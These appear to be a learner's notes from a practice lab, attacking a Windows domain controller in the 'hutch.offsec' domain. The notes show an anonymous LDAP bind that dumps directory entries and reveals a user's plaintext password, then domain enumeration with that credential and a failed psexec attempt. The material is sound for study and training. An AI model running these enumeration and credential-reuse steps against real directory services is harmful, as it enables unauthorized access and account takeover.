# 4 ldap\_2

```
Using https://book.hacktricks.xyz/pentesting/pentesting-ldap#manual-1

# checking if null creds are valid
$ ldapsearch -x -h 192.168.136.122 -D '' -w '' -b "DC=hutch,DC=offsec"
# extended LDIF
#
# LDAPv3
# base <DC=hutch,DC=offsec> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# hutch.offsec
dn: DC=hutch,DC=offsec

# Administrator, Users, hutch.offsec
dn: CN=Administrator,CN=Users,DC=hutch,DC=offsec

# lots of text 
# one user password is displayed

# Freddy McSorley, Users, hutch.offsec
dn: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
cn: Freddy McSorley
description: Password set to CrabSharkJellyfish192 at user's request. Please c
 hange on next login.
distinguishedName: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
name: Freddy McSorley
logonCount: 2
sAMAccountName: fmcsorley
userPrincipalName: fmcsorley@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec

# now that we have creds
hutch\fmcsorley:CrabSharkJellyfish192

# lets enumerate domain computer information
$ ldapdomaindump 192.168.136.122 -u 'hutch\fmcsorley' -p 'CrabSharkJellyfish192' --authtype SIMPLE --no-json --no-grep
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished

# domain_computers.html
OS: Windows Server 2019 Standard
OS Version: 10.0 (17763)

# as we have creds and 5985 is open, evil-rm or psexec?
$ psexec.py fmcsorley:'CrabSharkJellyfish192'@192.168.136.122
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 192.168.136.122.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
```
